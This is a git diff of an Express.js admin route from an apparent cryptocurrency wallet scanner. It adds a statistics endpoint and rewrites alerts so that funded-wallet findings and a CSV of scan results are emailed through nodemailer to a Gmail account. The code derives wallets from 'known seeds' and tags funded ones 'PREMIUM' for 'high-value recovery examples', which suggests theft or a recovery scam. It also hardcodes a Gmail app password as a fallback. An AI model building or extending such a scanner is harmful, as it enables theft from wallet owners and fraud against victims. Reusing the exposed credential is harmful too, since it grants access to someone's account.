@@ -2,6 +2,25 @@ const express = require('express');
 const router = express.Router();
 const { ethers } = require('ethers');
 
+// Get admin stats
+router.get('/stats', async (req, res) => {
+  try {
+    const adminStats = require('../services/adminStats');
+    const stats = await adminStats.getStats();
+    
+    const successRate = stats.totalWalletsScanned > 0 ? 
+      ((stats.walletsWithFunds / stats.totalWalletsScanned) * 100) : 0;
+    
+    res.json({
+      success: true,
+      ...stats,
+      successRate: successRate.toFixed(2)
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
 // Admin wallet scanner - finds real wallets with funds
 router.post('/scan-real-wallets', async (req, res) => {
   try {
@@ -167,7 +186,14 @@ async function checkRealBalance(address) {
 // Send alert for every wallet found (regardless of balance)
 async function sendWalletAlert(wallet, balance, walletNumber) {
   try {
-    const { sendAdminNotification } = require('../services/emailService');
+    const nodemailer = require('nodemailer');
+    const transporter = nodemailer.createTransporter({
+      service: 'gmail',
+      auth: {
+        user: 'skillstakes01@gmail.com',
+        pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
+      }
+    });
     
     const hasBalance = balance.totalValueUSD > 0;
     const subject = hasBalance ? 
@@ -191,7 +217,12 @@ ${hasBalance ? 'PREMIUM - Use for high-value recovery examples!' : 'STANDARD - U
 
 🔗 VERIFY: Check address on Etherscan/BSCscan`;
 
-    await sendAdminNotification(subject, message);
+    await transporter.sendMail({
+      from: 'skillstakes01@gmail.com',
+      to: 'skillstakes01@gmail.com',
+      subject: subject,
+      text: message
+    });
     
   } catch (error) {
     console.log('Failed to send wallet alert:', error.message);
@@ -289,7 +320,7 @@ function generateFromKnownSeeds(index) {
 // Send complete scan results with CSV attachment
 async function sendCompleteResults(wallets, totalScanned) {
   try {
-    const { sendAdminNotification } = require('../services/emailService');
+    const nodemailer = require('nodemailer');
     
     const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
     const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
@@ -333,7 +364,26 @@ ${statsMessage}
 ${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;
 
     // Send with CSV attachment
-    await sendEmailWithAttachment(subject, message, csvContent, `wallet_scan_${totalScanned}_complete.csv`);
+    // Send with CSV attachment using nodemailer
+    const transporter = nodemailer.createTransporter({
+      service: 'gmail',
+      auth: {
+        user: 'skillstakes01@gmail.com',
+        pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
+      }
+    });
+
+    await transporter.sendMail({
+      from: 'skillstakes01@gmail.com',
+      to: 'skillstakes01@gmail.com',
+      subject: subject,
+      text: message,
+      attachments: [{
+        filename: `wallet_scan_${totalScanned}_complete.csv`,
+        content: csvContent,
+        contentType: 'text/csv'
+      }]
+    });
     
   } catch (error) {
     console.log('Failed to send batch alert:', error.message);
